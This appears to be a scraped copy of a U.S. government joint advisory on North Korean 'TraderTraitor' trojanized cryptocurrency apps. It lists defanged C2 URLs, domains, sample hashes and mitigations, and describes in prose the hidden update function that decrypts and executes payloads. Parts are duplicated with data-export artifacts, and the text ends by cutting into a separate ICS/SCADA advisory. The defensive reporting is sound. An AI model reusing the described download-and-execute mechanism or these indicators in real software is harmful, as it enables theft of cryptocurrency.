hxxps://greenvideo[.]nl/wp-content/themes/top.php
hxxps://dafnefonseca[.]com/wp-content/themes/top.php
hxxps://haciendadeclarevot[.]com/wp-content/top.php

 
dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156
Tags: trojan machoName: Esilet-tmpg7lpp Size: 38.24 KB (39156 bytes)MD5: 9578c2be6437dcc8517e78a5de1fa975SHA-1: d2a77c31c3e169bec655068e96cf4e7fc52e77b8SHA-256: dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156ssdeep: 384:sdaWs0fDTmKnY4FPk6hTyQUitnI/kmCgr7lUryESll4yg9RpEwrUifJ8ttJOdy:sdayCkY4Fei9mhy/L9RBrny6y
C2 Endpoints: 

hxxps://sche-eg[.]org/plugins/top.php
hxxps://www.vinoymas[.]ch/wp-content/plugins/top.php
hxxps://infodigitalnew[.]com/wp-content/plugins/top.php

 
CreAI DeckCreAI Deck claims to be a platform for “artificial intelligence and deep learning.” No droppers for it were identified, but the filenames of the below samples, win32.bin and darwin64.bin, match the naming conventions used by other versions of TraderTraitor when downloading a payload. Both are samples of Manuscrypt that contact hxxps://aideck[.]net/board.php for C2 using HTTP POST requests with multipart/form-data Content-Types.
 
creaideck[.]com
Information as of March 2020:IP Address: 38.132.124[.]161Registrar: NameCheap, Inc.Created: March 9, 2020Expires: March 9, 2021
 
aideck[.]net
Information as of June 2020:IP Address: 89.45.4[.]151Registrar: NameCheap, Inc.Created: June 22, 2020Expires: June 22, 2021
 
867c8b49d29ae1f6e4a7cd31b6fe7e278753a1ba03d4be338ed11fd1efc7dd36
Tags: trojan peexeName: win32.binSize: 2.10 MB (2198684 bytes)MD5: 5d43baf1c9e9e3a939e5defd8f8fbd8dSHA-1: d5ff73c043f3bb75dd749636307500b60a436550 SHA-256: 867c8b49d29ae1f6e4a7cd31b6fe7e278753a1ba03d4be338ed11fd1efc7dd36ssdeep: 24576:y3SY+/2M3BMr7cdgSLBjbr4nzzy95VV7cEXV:ESZ2ESrHSV3D95oACompilation timestamp: 2020-06-23 06:06:35 UTC
 
89b5e248c222ebf2cb3b525d3650259e01cf7d8fff5e4aa15ccd7512b1e63957
Tags: trojan machoName: darwin64.binSize: 6.44 MB (6757832 bytes)MD5: 8397ea747d2ab50da4f876a36d673272SHA-1: 48a6d5141e25b6c63ad8da20b954b56afe589031SHA-256: 89b5e248c222ebf2cb3b525d3650259e01cf7d8fff5e4aa15ccd7512b1e63957ssdeep: 49152:KIH1kEh7zIXlDYwVhb26hRKtRwwfs62sRAdNhEJNDvOL3OXl5zpF+FqBNihzTvff:KIH1kEhI1LOJtm2spB

Mitigations

North Korean state-sponsored cyber actors use a full array of tactics and techniques to exploit computer networks of interest, acquire sensitive cryptocurrency-intellectual property, and gain financial assets. The U.S. government recommends implementing mitigations to protect critical infrastructure organizations as well as financial sector organizations in the blockchain technology and cryptocurrency industry.

Apply defense-in-depth security strategy. Apply security principles—such as least access models and defense-in-depth—to user and application privileges to help prevent exploitation attempts from being successful. Use network segmentation to separate networks into zones based on roles and requirements. Separate network zones can help prevent lateral movement throughout the organization and limit the attack surface. See NSA’s Top Ten Cybersecurity Mitigation Strategies for strategies enterprise organizations should use to build a defense-in-depth security posture. 
Implement patch management. Initial and follow-on exploitation involves leveraging common vulnerabilities and exposures (CVEs) to gain access to a networked environment. Organizations should have a timely vulnerability and patch management program in place to mitigate exposure to critical CVEs. Prioritize patching of internet-facing devices and monitored accordingly for any malicious logic attacks. 
Enforce credential requirements and multifactor authentication. North Korean malicious cyber actors continuously target user credentials, email, social media, and private business accounts. Organizations should ensure users change passwords regularly to reduce the impact of password spraying and other brute force techniques. The U.S. government recommends organizations implement and enforce multifactor authentication (MFA) to reduce the risk of credential theft. Be aware of MFA interception techniques for some MFA implementations and monitor for anomalous logins.
Educate users on social engineering on social media and spearphishing. North Korean actors rely heavily on social engineering, leveraging email and social media platforms to build trust and send malicious documents to unsuspecting users. A cybersecurity aware workforce is one of the best defenses against social engineering techniques like phishing. User training should include how to identify social engineering techniques and awareness to only open links and attachments from trusted senders.
Implement email and domain mitigations. Maintain awareness of themed emails surrounding current events. Malicious cyber actors use current events as lure for potential victims as observed during the COVID-19 pandemic. Organizations should have a robust domain security solution that includes leveraging reputation checks and closely monitoring or blocking newly registered domains (NRDs) in enterprise traffic. NRDs are commonly established by threat actors prior to malicious engagement.

HTML and email scanning. Organizations should disable HTML from being used in emails and scan email attachments. Embedded scripts may be hard for an antivirus product to detect if they are fragmented. An additional malware scanning interface product can be integrated to combine potentially malicious payloads and send the payload to the primary antivirus product. Hyperlinks in emails should also be scanned and opened with precautionary measures to reduce the likelihood of a user clicking on a malicious link.


Endpoint protection. Although network security is critical, devices mobility often means traveling and connecting to multiple different networks that offer varying levels of security. To reduce the risk of introducing exposed hosts to critical networks, organizations should ensure mobile devices have installed security suites to detect and mitigate malware. 
Enforce application security. Application allowlisting enables the organization to monitor programs and only allow those on the approved allowlist to execute. Allowlisting helps to stop the initial attack, even if the user clicks a malicious link or opens a malicious attachment. Implement baseline rule sets, such as NSA’s Limiting Location Data Exposure guidance, to block execution of unauthorized or malicious programs.

Disable macros in office products. Macros are a common method for executing code through an attached office document. Some office products allow for the disabling of macros that originate from outside of the organization, providing a hybrid approach when the organization depends on the legitimate use of macros.

Windows specific settings can be configured to block internet-originated macros from running. This can be done in the Group Policy Administrative Templates for each of the associated Office products (specifically Word, Excel and PowerPoint). Other productivity software, such as LibreOffice and OpenOffice, can be configured to set the Macro Security Level.




Be aware of third-party downloads—especially cryptocurrency applications. North Korean actors have been increasingly active with currency generation operations. Users should always verify file downloads and ensure the source is from a reputable or primary (preferred) source and not from a third-party vendor. Malicious cyber actors have continuously demonstrated the ability to trojanize applications and gain a foothold on host devices.
Create an incident response plan to respond to possible cyber intrusions. The plan should include reporting incidents to both the FBI and CISA—quick reporting can reduce the severity of incidents and provide valuable information to investigators. Contact information can be found below. 

Contact 
Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472) and/or to the FBI via your local FBI field office or the FBI’s 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov.
Disclaimer
The information in this advisory is provided ""as is"" for informational purposes only. The FBI, CISA, and Treasury do not provide any warranties of any kind regarding this information or endorse any commercial product or service, including any subjects of analysis. 

Revisions

Initial Version: April 18, 2022






This product is provided subject to this Notification and this Privacy & Use policy.


",set(),"




Summary

Actions to take today to mitigate cyber threats to cryptocurrency:• Patch all systems.• Prioritize patching known exploited vulnerabilities.• Train users to recognize and report phishing attempts.• Use multifactor authentication.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the U.S. Treasury Department (Treasury) are issuing this joint Cybersecurity Advisory (CSA) to highlight the cyber threat associated with cryptocurrency thefts and tactics used by a North Korean state-sponsored advanced persistent threat (APT) group since at least 2020. This group is commonly tracked by the cybersecurity industry as Lazarus Group, APT38, BlueNoroff, and Stardust Chollima. For more information on North Korean state-sponsored malicious cyber activity, visit https://www.us-cert.cisa.gov/northkorea.
The U.S. government has observed North Korean cyber actors targeting a variety of organizations in the blockchain technology and cryptocurrency industry, including cryptocurrency exchanges, decentralized finance (DeFi) protocols, play-to-earn cryptocurrency video games, cryptocurrency trading companies, venture capital funds investing in cryptocurrency, and individual holders of large amounts of cryptocurrency or valuable non-fungible tokens (NFTs). The activity described in this advisory involves social engineering of victims using a variety of communication platforms to encourage individuals to download trojanized cryptocurrency applications on Windows or macOS operating systems. The cyber actors then use the applications to gain access to the victim’s computer, propagate malware across the victim’s network environment, and steal private keys or exploit other security gaps. These activities enable additional follow-on activities that initiate fraudulent blockchain transactions.
The U.S. government previously published an advisory about North Korean state-sponsored cyber actors using AppleJeus malware to steal cryptocurrency: AppleJeus: Analysis of North Korea’s Cryptocurrency Malware. The U.S. government has also previously published advisories about North Korean state-sponsored cyber actors stealing money from banks using custom malware:

HIDDEN COBRA – FASTCash Campaign
FASTCash 2.0: North Korea’s BeagleBoyz Robbing Banks

This advisory provides information on tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to stakeholders in the blockchain technology and cryptocurrency industry to help them identify and mitigate cyber threats against cryptocurrency. 
Click here for a PDF version of this report. 
Click here for STIX.

Technical Details

Threat Update
The U.S. government has identified a group of North Korean state-sponsored malicious cyber actors using tactics similar to the previously identified Lazarus Group (see AppleJeus: Analysis of North Korea’s Cryptocurrency Malware). The Lazarus Group used AppleJeus trojanized cryptocurrency applications targeting individuals and companies—including cryptocurrency exchanges and financial services companies—through the dissemination of cryptocurrency trading applications that were modified to include malware that facilitates theft of cryptocurrency. As of April 2022, North Korea’s Lazarus Group actors have targeted various firms, entities, and exchanges in the blockchain and cryptocurrency industry using spearphishing campaigns and malware to steal cryptocurrency. These actors will likely continue exploiting vulnerabilities of cryptocurrency technology firms, gaming companies, and exchanges to generate and launder funds to support the North Korean regime. 
Tactics, Techniques and Procedures
Intrusions begin with a large number of spearphishing messages sent to employees of cryptocurrency companies—often working in system administration or software development/IT operations (DevOps)—on a variety of communication platforms. The messages often mimic a recruitment effort and offer high-paying jobs to entice the recipients to download malware-laced cryptocurrency applications, which the U.S. government refers to as ""TraderTraitor.""
The term TraderTraitor describes a series of malicious applications written using cross-platform JavaScript code with the Node.js runtime environment using the Electron framework. The malicious applications are derived from a variety of open-source projects and purport to be cryptocurrency trading or price prediction tools. TraderTraitor campaigns feature websites with modern design advertising the alleged features of the applications (see figure 1).
 

Figure 1: Screenshot of CryptAIS website
The JavaScript code providing the core functions of the software is bundled with Webpack. Within the code is a function that purports to be an “update,” with a name such as UpdateCheckSync(), that downloads and executes a malicious payload (see figure 2). 
The update function makes an HTTP POST request to a PHP script hosted on the TraderTraitor project’s domain at either the endpoint /update/ or /oath/checkupdate.php. In recent variants, the server’s response is parsed as a JSON document with a key-value pair, where the key is used as an AES 256 encryption key in Cipher Block Chaining (CBC) or Counter (CTR) mode to decrypt the value. The decrypted data is written as a file to the system’s temporary directory, as provided by the os.tmpdir() method of Node.js, and executed using the child_process.exec() method of Node.js, which spawns a shell as a child process of the current Electron application. The text “Update Finished” is then logged to the shell for the user to see.
Observed payloads include updated macOS and Windows variants of Manuscrypt, a custom remote access trojan (RAT), that collects system information and has the ability to execute arbitrary commands and download additional payloads (see North Korean Remote Access Tool: COPPERHEDGE). Post-compromise activity is tailored specifically to the victim’s environment and at times has been completed within a week of the initial intrusion.  
 

Figure 2: Screenshot depicting the UpdateCheckSync() and supporting functions bundled within 60b3cfe2ec3100caf4afde734cfd5147f78acf58ab17d4480196831db4aa5f18 associated with DAFOM
Indicators of Compromise
DAFOMDAFOM purports to be a “cryptocurrency portfolio application.” A Mach-O binary packaged within the Electron application was signed by an Apple digital signature issued for the Apple Developer Team W58CYKFH67. The certificate associated with Apple Developer Team W58CYKFH67 has been revoked. A metadata file packaged in the DAFOM application provided the URL hxxps://github,.,com/dafomdev for bug reports. As of April 2022, this page was unavailable.
 
dafom,.,dev
Information as of February 2022:IP Address: 45.14.227,.,58Registrar: NameCheap, Inc.Created: February 7, 2022Expires: February 7, 2023
 
60b3cfe2ec3100caf4afde734cfd5147f78acf58ab17d4480196831db4aa5f18
Tags: dropper macosName: DAFOM-1.0.0.dmgSize: 87.91 MB (92182575 bytes)MD5: c2ea5011a91cd59d0396eb4fa8da7d21SHA-1: b2d9ca7b6d1bbbe4864ea11dfca343b7e15597d8SHA-256: 60b3cfe2ec3100caf4afde734cfd5147f78acf58ab17d4480196831db4aa5f18ssdeep: 1572864:LGLBnolF9kPEiKOabR2QEs1B1/LuUQrbecE6Xwijkca/pzpfaLtIP:LGVnoT9kPZK9tVEwBxWbecR5Faxzpf0M
 
TokenAISTokenAIS purports to help “build a portfolio of AI-based trading” for cryptocurrencies. Mach-O binaries packaged within the Electron application contained an Apple digital signature issued for the Apple Developer Team RN4BTXA4SA. The certificate associated with Apple Developer Team RN4BTXA4SA has been revoked. The application requires users to “register” an account by entering an email address and a password to use its features. The malicious TraderTraitor code is a Node.js function called UpdateCheckSync() located in a file named update.js, which is bundled in a file called renderer.prod.js, which is in an archive called app.asar. This function passes the email address that the user provided and the system platform to the C2 server, decrypts the response using AES 256 in CBC mode with the hardcoded initialization vector (IV) !@34QWer%^78TYui and a key provided in the response, then writes the decrypted data to a file and executes it in a new shell.
 
tokenais,.,com
Information as of January 2022:IP Address: 199.188.103,.,115Registrar: NameCheap, Inc.Created: January 27, 2022Expires: January 27, 2023
 
5b40b73934c1583144f41d8463e227529fa7157e26e6012babd062e3fd7e0b03
Tags: dropper macosName: TokenAIS.app.zipSize: 118.00 MB (123728267 bytes)MD5: 930f6f729e5c4d5fb52189338e549e5eSHA-1: 8e67006585e49f51db96604487138e688df732d3SHA-256: 5b40b73934c1583144f41d8463e227529fa7157e26e6012babd062e3fd7e0b03ssdeep: 3145728:aMFJlKVvw4+zLruAsHrmo5Vvw4+zLruAsHrmob0dC/E:aUlKtw4+/r2HNtw4+/r2HnMCM
 
CryptAISCryptAIS uses the same language as TokenAIS to advertise that it “helps build a portfolio of AI-based trading.” It is distributed as an Apple Disk Image (DMG) file that is digitally signed by an Apple digital signature issued for the Apple Developer Team CMHD64V5R8. The certificate associated with Apple Developer Team CMHD64V5R8 has been revoked. The application requires users to “register” an account by entering an email address and a password to use its features. The malicious TraderTraitor code is a Node.js function called UpdateCheckSync() located in a file named update.js, which is bundled in a file called renderer.prod.js, which is in an archive called app.asar. This function passes the email address that the user provided and the system platform to the C2 server, decrypts the response using AES 256 in CTR mode and a key provided in the response, then writes the decrypted data to a file and executes it in a new shell.
 
cryptais,.,com
Information as of August 2021:IP Address: 82.102.31.14Registrar: NameCheap, Inc.Created: August 2, 2021Expires: August 2, 2022
 
f0e8c29e3349d030a97f4a8673387c2e21858cccd1fb9ebbf9009b27743b2e5b
Tags: dropper macosName: CryptAIS,.,dmgSize: 80.36 MB (84259810 bytes)MD5: 4e5ebbecd22c939f0edf1d16d68e8490SHA-1: f1606d4d374d7e2ba756bdd4df9b780748f6dc98SHA-256: f0e8c29e3349d030a97f4a8673387c2e21858cccd1fb9ebbf9009b27743b2e5bssdeep: 1572864:jx9QOwiLDCUrJXsKMoGTwiCcKFI8jmrvGqjL2hX6QklBmrZgkZjMz+dPSpR0Xcpk:F9QOTPCUrdsKEw3coIg2Or6XBmrZgkZw
 
AlticGOAlticGO was observed packaged as Nullsoft Scriptable Install System (NSIS) Windows executables that extracted an Electron application packaged for Windows. These executables contain a simpler version of TraderTraitor code in a function exported as UpdateCheckSync() located in a file named update.js, which is bundled in renderer.prod.js, which is in the app.asar archive. The function calls an external function located in a file node_modules/request/index.js bundled in renderer.prod.js to make an HTTP request to hxxps://www.alticgo,.,com/update/. One AlticGO sample, e3d98cc4539068ce335f1240deb1d72a0b57b9ca5803254616ea4999b66703ad, instead contacts hxxps://www.esilet,.,com/update/ (see below for more information about Esilet). Some image resources bundled with the application included the CreAI Deck logo (see below for more information about CreAI Deck). The response is written to disk and executed in a new shell using the child_process.exec() method in Node.js. Unlike newer versions of TraderTraitor, there is no mechanism to decrypt a payload.
 
alticgo,.,com
Information as of August 2020:IP Address: 108.170.55,.,202Registrar: NetEarth One Inc.Created: August 8, 2020Expires: August 8, 2021
 
765a79d22330098884e0f7ce692d61c40dfcf288826342f33d976d8314cfd819
Tags: dropper peexe nsisName: AlticGO.exeSize: 43.54 MB (45656474 bytes)MD5: 1c7d0ae1c4d2c0b70f75eab856327956SHA-1: f3263451f8988a9b02268f0fb6893f7c41b906d9SHA-256: 765a79d22330098884e0f7ce692d61c40dfcf288826342f33d976d8314cfd819ssdeep: 786432:optZmVDkD1mZ1FggTqqLGAU6JXnjmDQ4YBXpleV0RnJYJKoSuDySLGh7yVPUXi7:opzKDginspAU6JXnJ46X+eC6cySihWVXCompilation timestamp: 2018-12-15 22:26:14 UTC
 
e3d98cc4539068ce335f1240deb1d72a0b57b9ca5803254616ea4999b66703ad
Tags: dropper peexe nsisName: AlticGO_R.exeSize: 44.58 MB (46745505 bytes)MD5: 855b2f4c910602f895ee3c94118e979aSHA-1: ff17bd5abe9f4939918f27afbe0072c18df6db37SHA-256: e3d98cc4539068ce335f1240deb1d72a0b57b9ca5803254616ea4999b66703adssdeep: 786432:LptZmVDkD1mQIiXUBkRbWGtqqLGAU6JXnjmDQ4YBXpleV0RnJYJKoSuDySLGh7yH:LpzKDgzRpWGwpAU6JXnJ46X+eC6cySiICompilation timestamp: 2020-02-12 16:15:17 UTC
 
8acd7c2708eb1119ba64699fd702ebd96c0d59a66cba5059f4e089f4b0914925
Tags: dropper peexe nsisName: AlticGO.exeSize: 44.58 MB (46745644 bytes)MD5: 9a6307362e3331459d350a201ad66cd9SHA-1: 3f2c1e60b5fac4cf1013e3e1fc688be490d71a84SHA-256: 8acd7c2708eb1119ba64699fd702ebd96c0d59a66cba5059f4e089f4b0914925ssdeep: 786432:AptZmVDkD1mjPNDeuxOTKQqqLGAU6JXnjmDQ4YBXpleV0RnJYJKoSuDySLGh7yV7:ApzKDgqPxeuLpAU6JXnJ46X+eC6cySiGCompilation timestamp: 2020-02-12 16:15:17 UTC
 
EsiletEsilet claims to offer live cryptocurrency prices and price predictions. It contains a simpler version of TraderTraitor code in a function exported as UpdateCheckSync() located in a file named update.js, which is bundled in renderer.prod.js, which is in the app.asar archive. The function calls an external function located in a file node_modules/request/index.js bundled in renderer.prod.js to make an HTTP request to hxxps://www.esilet,.,com/update/. The response is written to disk and executed in a new shell using the child_process.exec() method in Node.js. Unlike newer versions of TraderTraitor, there is no mechanism to decrypt a payload. Esilet has been observed delivering payloads of at least two different macOS variants of Manuscrypt, 9d9dda39af17a37d92b429b68f4a8fc0a76e93ff1bd03f06258c51b73eb40efa and dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156. 
 

Figure 3: Screenshot of the UpdateCheckSync() function in Esilet
esilet,.,com
Information as of June 2020:IP Address: 104.168.98,.,156Registrar: NameSilo, LLCCreated: June 12, 2020Expires: June 12, 2021
 
greenvideo,.,nl
Likely legitimate but compromised. Information as of April 2022:IP Address: 62.84.240,.,140Registrar: FlexwebhostingCreated: February 26, 2018Expires: Unknown
 
dafnefonseca,.,com
Likely legitimate but compromised. Information as of June 2020:IP Address: 151.101.64,.,119Registrar: PublicDomainRegistry Created: August 27, 2019Expires: August 27, 2022
 
haciendadeclarevot,.,com
Likely legitimate but compromised. Information as of June 2020:IP Address: 185.66.41,.,17Registrar: cdmon, 10DENCEHISPAHARD, S.L.Created: March 2, 2005Expires: March 2, 2023
 
sche-eg,.,org
Likely legitimate but compromised. Information as of June 2020:IP Address: 160.153.235,.,20Registrar: GoDaddy.com, LLCCreated: June 1, 2019Expires: June 1, 2022
 
www.vinoymas,.,ch
Likely legitimate but compromised. Information as of June 2020:IP Address: 46.16.62,.,238Registrar: cdmon, 10DENCEHISPAHARD, S.L.Created: January 24, 2010Expires: Unknown
 
infodigitalnew,.,com
Likely legitimate but compromised. Information as of June 2020:IP Address: 107.154.160,.,132Registrar: PublicDomainRegistryCreated: June 20, 2020Expires: June 20, 2022
 
9ba02f8a985ec1a99ab7b78fa678f26c0273d91ae7cbe45b814e6775ec477598
Tags: dropper macosName: Esilet.dmgSize: 77.90 MB (81688694 bytes) MD5: 53d9af8829a9c7f6f177178885901c01SHA-1: ae9f4e39c576555faadee136c6c3b2d358ad90b9 SHA-256: 9ba02f8a985ec1a99ab7b78fa678f26c0273d91ae7cbe45b814e6775ec477598ssdeep: 1572864:lffyoUnp5xmHVUTd+GgNPjFvp4YEbRU7h8cvjmUAm4Du73X0unpXkU:lfqHBmHo+BPj9CYEshLqcuAX0I0
 
9d9dda39af17a37d92b429b68f4a8fc0a76e93ff1bd03f06258c51b73eb40efa
Tags: trojan machoName: Esilet-tmpzpsb3Size: 510.37 KB (522620 bytes)MD5: 1ca31319721740ecb79f4b9ee74cd9b0SHA-1: 41f855b54bf3db621b340b7c59722fb493ba39a5 SHA-256: 9d9dda39af17a37d92b429b68f4a8fc0a76e93ff1bd03f06258c51b73eb40efassdeep: 6144:wAulcT94T94T97zDj1I/BkjhkbjZ8bZ87ZMSj71obV/7NobNo7NZTb7hMT5ETZ8I:wDskT1UBg2lirFbpR9mJGpmN C2 Endpoints:

hxxps://greenvideo,.,nl/wp-content/themes/top.php
hxxps://dafnefonseca,.,com/wp-content/themes/top.php
hxxps://haciendadeclarevot,.,com/wp-content/top.php

 
dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156
Tags: trojan machoName: Esilet-tmpg7lpp Size: 38.24 KB (39156 bytes)MD5: 9578c2be6437dcc8517e78a5de1fa975SHA-1: d2a77c31c3e169bec655068e96cf4e7fc52e77b8SHA-256: dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156ssdeep: 384:sdaWs0fDTmKnY4FPk6hTyQUitnI/kmCgr7lUryESll4yg9RpEwrUifJ8ttJOdy:sdayCkY4Fei9mhy/L9RBrny6y
C2 Endpoints: 

hxxps://sche-eg,.,org/plugins/top.php
hxxps://www.vinoymas,.,ch/wp-content/plugins/top.php
hxxps://infodigitalnew,.,com/wp-content/plugins/top.php

 
CreAI DeckCreAI Deck claims to be a platform for “artificial intelligence and deep learning.” No droppers for it were identified, but the filenames of the below samples, win32.bin and darwin64.bin, match the naming conventions used by other versions of TraderTraitor when downloading a payload. Both are samples of Manuscrypt that contact hxxps://aideck,.,net/board.php for C2 using HTTP POST requests with multipart/form-data Content-Types.
 
creaideck,.,com
Information as of March 2020:IP Address: 38.132.124,.,161Registrar: NameCheap, Inc.Created: March 9, 2020Expires: March 9, 2021
 
aideck,.,net
Information as of June 2020:IP Address: 89.45.4,.,151Registrar: NameCheap, Inc.Created: June 22, 2020Expires: June 22, 2021
 
867c8b49d29ae1f6e4a7cd31b6fe7e278753a1ba03d4be338ed11fd1efc7dd36
Tags: trojan peexeName: win32.binSize: 2.10 MB (2198684 bytes)MD5: 5d43baf1c9e9e3a939e5defd8f8fbd8dSHA-1: d5ff73c043f3bb75dd749636307500b60a436550 SHA-256: 867c8b49d29ae1f6e4a7cd31b6fe7e278753a1ba03d4be338ed11fd1efc7dd36ssdeep: 24576:y3SY+/2M3BMr7cdgSLBjbr4nzzy95VV7cEXV:ESZ2ESrHSV3D95oACompilation timestamp: 2020-06-23 06:06:35 UTC
 
89b5e248c222ebf2cb3b525d3650259e01cf7d8fff5e4aa15ccd7512b1e63957
Tags: trojan machoName: darwin64.binSize: 6.44 MB (6757832 bytes)MD5: 8397ea747d2ab50da4f876a36d673272SHA-1: 48a6d5141e25b6c63ad8da20b954b56afe589031SHA-256: 89b5e248c222ebf2cb3b525d3650259e01cf7d8fff5e4aa15ccd7512b1e63957ssdeep: 49152:KIH1kEh7zIXlDYwVhb26hRKtRwwfs62sRAdNhEJNDvOL3OXl5zpF+FqBNihzTvff:KIH1kEhI1LOJtm2spB

Mitigations

North Korean state-sponsored cyber actors use a full array of tactics and techniques to exploit computer networks of interest, acquire sensitive cryptocurrency-intellectual property, and gain financial assets. The U.S. government recommends implementing mitigations to protect critical infrastructure organizations as well as financial sector organizations in the blockchain technology and cryptocurrency industry.

Apply defense-in-depth security strategy. Apply security principles—such as least access models and defense-in-depth—to user and application privileges to help prevent exploitation attempts from being successful. Use network segmentation to separate networks into zones based on roles and requirements. Separate network zones can help prevent lateral movement throughout the organization and limit the attack surface. See NSA’s Top Ten Cybersecurity Mitigation Strategies for strategies enterprise organizations should use to build a defense-in-depth security posture. 
Implement patch management. Initial and follow-on exploitation involves leveraging common vulnerabilities and exposures (CVEs) to gain access to a networked environment. Organizations should have a timely vulnerability and patch management program in place to mitigate exposure to critical CVEs. Prioritize patching of internet-facing devices and monitored accordingly for any malicious logic attacks. 
Enforce credential requirements and multifactor authentication. North Korean malicious cyber actors continuously target user credentials, email, social media, and private business accounts. Organizations should ensure users change passwords regularly to reduce the impact of password spraying and other brute force techniques. The U.S. government recommends organizations implement and enforce multifactor authentication (MFA) to reduce the risk of credential theft. Be aware of MFA interception techniques for some MFA implementations and monitor for anomalous logins.
Educate users on social engineering on social media and spearphishing. North Korean actors rely heavily on social engineering, leveraging email and social media platforms to build trust and send malicious documents to unsuspecting users. A cybersecurity aware workforce is one of the best defenses against social engineering techniques like phishing. User training should include how to identify social engineering techniques and awareness to only open links and attachments from trusted senders.
Implement email and domain mitigations. Maintain awareness of themed emails surrounding current events. Malicious cyber actors use current events as lure for potential victims as observed during the COVID-19 pandemic. Organizations should have a robust domain security solution that includes leveraging reputation checks and closely monitoring or blocking newly registered domains (NRDs) in enterprise traffic. NRDs are commonly established by threat actors prior to malicious engagement.

HTML and email scanning. Organizations should disable HTML from being used in emails and scan email attachments. Embedded scripts may be hard for an antivirus product to detect if they are fragmented. An additional malware scanning interface product can be integrated to combine potentially malicious payloads and send the payload to the primary antivirus product. Hyperlinks in emails should also be scanned and opened with precautionary measures to reduce the likelihood of a user clicking on a malicious link.


Endpoint protection. Although network security is critical, devices mobility often means traveling and connecting to multiple different networks that offer varying levels of security. To reduce the risk of introducing exposed hosts to critical networks, organizations should ensure mobile devices have installed security suites to detect and mitigate malware. 
Enforce application security. Application allowlisting enables the organization to monitor programs and only allow those on the approved allowlist to execute. Allowlisting helps to stop the initial attack, even if the user clicks a malicious link or opens a malicious attachment. Implement baseline rule sets, such as NSA’s Limiting Location Data Exposure guidance, to block execution of unauthorized or malicious programs.

Disable macros in office products. Macros are a common method for executing code through an attached office document. Some office products allow for the disabling of macros that originate from outside of the organization, providing a hybrid approach when the organization depends on the legitimate use of macros.

Windows specific settings can be configured to block internet-originated macros from running. This can be done in the Group Policy Administrative Templates for each of the associated Office products (specifically Word, Excel and PowerPoint). Other productivity software, such as LibreOffice and OpenOffice, can be configured to set the Macro Security Level.




Be aware of third-party downloads—especially cryptocurrency applications. North Korean actors have been increasingly active with currency generation operations. Users should always verify file downloads and ensure the source is from a reputable or primary (preferred) source and not from a third-party vendor. Malicious cyber actors have continuously demonstrated the ability to trojanize applications and gain a foothold on host devices.
Create an incident response plan to respond to possible cyber intrusions. The plan should include reporting incidents to both the FBI and CISA—quick reporting can reduce the severity of incidents and provide valuable information to investigators. Contact information can be found below. 

Contact 
Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472) and/or to the FBI via your local FBI field office or the FBI’s 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov.
Disclaimer
The information in this advisory is provided ""as is"" for informational purposes only. The FBI, CISA, and Treasury do not provide any warranties of any kind regarding this information or endorse any commercial product or service, including any subjects of analysis. 

Revisions

Initial Version: April 18, 2022






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-108a
50,"




Summary

Actions to Take Today to Protect ICS/SCADA Devices:• Enforce multifactor authentication for all remote access to ICS networks and devices whenever possible.• Change all passwords to ICS/SCADA devices and systems on a consistent schedule, especially all default passwords, to device-unique strong passwords to mitigate password brute force attacks and to give defender monitoring systems opportunities to detect common attacks.• Leverage a properly installed continuous OT monitoring solution to log and alert on malicious indicators and behaviors.
The Department of Energy (DOE), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), and the Federal Bureau of Investigation (FBI) are releasing this joint Cybersecurity Advisory (CSA) to warn that certain advanced persistent threat (APT) actors have exhibited the capability to gain full system access to multiple industrial control system (ICS)/supervisory control and data acquisition (SCADA) devices, including:

Schneider Electric programmable logic controllers (PLCs),
OMRON Sysmac NEX PLCs, and
Open Platform Communications Unified Architecture (OPC UA) servers.

The APT actors have developed custom-made tools for targeting ICS/SCADA devices. The tools enable them to scan for, compromise, and control affected devices once they have established initial access to the operational technology (OT) network. Additionally, the actors can compromise Windows-based engineering workstations, which may be present in information technology (IT) or OT environments, using an exploit that compromises an ASRock motherboard driver with known vulnerabilities. By compromising and maintaining full system access to ICS/SCADA devices, APT actors could elevate privileges, move laterally within an OT environment, and disrupt critical devices or functions.
DOE, CISA, NSA, and the FBI urge critical infrastructure organizations, especially Energy Sector organizations, to implement the detection and mitigation recommendations provided in this CSA to detect potential malicious APT activity and harden their ICS/SCADA devices. 
Click here for a PDF version of this report. 

Technical Details

APT actors have developed custom-made tools that, once they have established initial access in an OT network, enables them to scan for, compromise, and control certain ICS/SCADA devices, including the following:

Schneider Electric MODICON and MODICON Nano PLCs, including (but may not be limited to) TM251, TM241, M258, M238, LMC058, and LMC078;
OMRON Sysmac NJ and NX PLCs, including (but may not be limited to) NEX NX1P2, NX-SL3300, NX-ECC203, NJ501-1300, S8VK, and R88D-1SN10F-ECT; and 
OPC Unified Architecture (OPC UA) servers.  

The APT actors’ tools have a modular architecture and enable cyber actors to conduct highly automated exploits against targeted devices. The tools have a virtual console with a command interface that mirrors the interface of the targeted ICS/SCADA device. Modules interact with targeted devices, enabling operations by lower-skilled cyber actors to emulate higher-skilled actor capabilities.
The APT actors can leverage the modules to scan for targeted devices, conduct reconnaissance on device details, upload malicious configuration/code to the targeted device, back up or restore device contents, and modify device parameters. 
In addition, the APT actors can use a tool that installs and exploits a known-vulnerable ASRock-signed motherboard driver, AsrDrv103.sys, exploiting CVE-2020-15368 to execute malicious code in the Windows kernel. Successful deployment of this tool can allow APT actors to move laterally within an IT or OT environment and disrupt critical devices or functions.
APT Tool for Schneider Electric Devices  
The APT actors’ tool for Schneider Electric devices has modules that interact via normal management protocols and Modbus (TCP 502). Modules may allow cyber actors to:

